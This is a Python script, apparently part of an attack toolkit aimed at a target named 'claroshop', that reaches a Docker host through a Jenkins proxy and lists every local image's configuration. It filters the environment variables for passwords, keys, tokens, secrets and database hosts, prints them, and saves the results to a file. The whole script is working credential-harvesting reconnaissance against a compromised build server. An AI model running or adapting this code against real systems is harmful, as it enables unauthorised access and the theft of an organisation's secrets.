"""
Fetch /images/{name}/json for all local images on the docker host (via Jenkins proxy)
and extract Env, Cmd, Entrypoint, ExposedPorts, Labels.
Saves to claroshop_attack/image_configs.json
"""
import sys, os, io, json, urllib.parse

sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding="utf-8", errors="replace")
HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)
from docker_api import docker_request

tags = json.load(open(os.path.join(HERE, "docker_local_tags.json"), encoding="utf-8"))
tags = [t for t in tags if t and "<none>" not in t]

out = {}
for t in tags:
    name = urllib.parse.quote(t, safe="")
    res = docker_request("GET", f"/images/{name}/json", timeout=60)
    i = res.find("{")
    if i == -1:
        print(f"[ERR] {t}: {res[:200]}")
        continue
    try:
        j = json.loads(res[i:res.rfind("}") + 1])
    except Exception as e:
        print(f"[PARSE-ERR] {t}: {e}")
        continue
    cfg = j.get("Config", {}) or {}
    out[t] = {
        "Env": cfg.get("Env"),
        "Cmd": cfg.get("Cmd"),
        "Entrypoint": cfg.get("Entrypoint"),
        "ExposedPorts": cfg.get("ExposedPorts"),
        "Labels": cfg.get("Labels"),
        "User": cfg.get("User"),
        "WorkingDir": cfg.get("WorkingDir"),
        "Created": j.get("Created"),
        "Size": j.get("Size"),
    }
    env = cfg.get("Env") or []
    interesting = [e for e in env if any(k in e.upper() for k in
                   ["PASS", "KEY", "SECRET", "TOKEN", "USER", "DB", "MYSQL", "MONGO", "REDIS", "URL", "HOST", "AUTH"])]
    print(f"[OK] {t}")
    for e in interesting:
        print(f"     ENV: {e}")

with open(os.path.join(HERE, "image_configs.json"), "w", encoding="utf-8") as f:
    json.dump(out, f, indent=1, ensure_ascii=False)
print(f"\nSAVED {len(out)} image configs -> image_configs.json")
